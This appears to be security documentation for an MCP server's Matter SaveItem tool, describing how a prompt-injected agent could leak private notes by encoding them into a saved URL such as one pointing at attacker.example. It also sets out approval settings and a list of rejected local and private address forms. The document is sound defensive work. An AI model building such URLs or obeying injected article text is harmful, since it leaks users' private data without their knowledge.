# SaveItem URLs

`Matter.SaveItem` sends a URL to Matter, and Matter's servers then fetch that URL to
extract the article. That makes the URL itself an outbound channel. An agent that has been
manipulated (for example by instructions hidden in an article it just read) could build a
URL such as `https://attacker.example/?n=<private note text>` and save it. Nothing in this
server talks to the URL directly, but Matter's fetch delivers whatever is in the URL to its
host.

## The control: approve the exact URL

Configure your MCP client to ask before every `SaveItem` call, and read the full URL in
the approval prompt, including the query string, before you approve it. This is the only
control that stops exfiltration through a public URL. Some examples:

- **Claude Code:** add the tool to the `ask` list in `.claude/settings.json`, using the
  name the gateway gives it (run `/mcp` to see it), for example
  `{"permissions": {"ask": ["mcp__matter__Matter_SaveItem"]}}`. Don't add it to `allow`.
- **Claude Desktop and claude.ai:** set the tool to **Needs approval** (never **Always
  allow**) in the connector's tool permissions.
- **Other clients:** use whatever per-tool confirmation they offer. If a client can't
  require approval for a single tool, connect it to a gateway that doesn't include `SaveItem`.

The tool description also tells the model to show the exact URL and get approval first.
That's a prompt, not a boundary: a manipulated model can ignore it.

## Defense in depth: URL checks

`SaveItem` rejects, before anything is sent to Matter:

- anything other than `http://` and `https://`, and malformed hosts or ports;
- URLs with embedded credentials (`https://user:pass@host/`);
- loopback, private, link-local, carrier-grade NAT, multicast and unspecified IP
  addresses, in IPv4 and IPv6, including shorthand IPv4 forms like `127.1`,
  `2130706433` and `0x7f.0.0.1`, and IPv6 forms that carry such an IPv4 address
  (IPv4-mapped, IPv4-compatible, SIIT, NAT64, 6to4 and Teredo);
- `localhost`, single-label names (`intranet`), `home.arpa`, and the `.localhost`,
  `.local`, `.internal`, `.lan` and `.home.arpa` suffixes;
- URLs longer than 2,048 characters.

## What the checks don't do

The checks are syntactic. They don't resolve DNS or follow redirects, so they can't stop:

- data encoded into a public URL's path or query (the main exfiltration risk above);
- a public name that resolves to a private address, or is rebound to one after a check;
- a public URL that redirects to a private one;
- anything unsafe Matter itself does when it fetches a page.

Treat them as a guard against mistakes and obvious abuse, and rely on approval of the
exact URL for the rest.
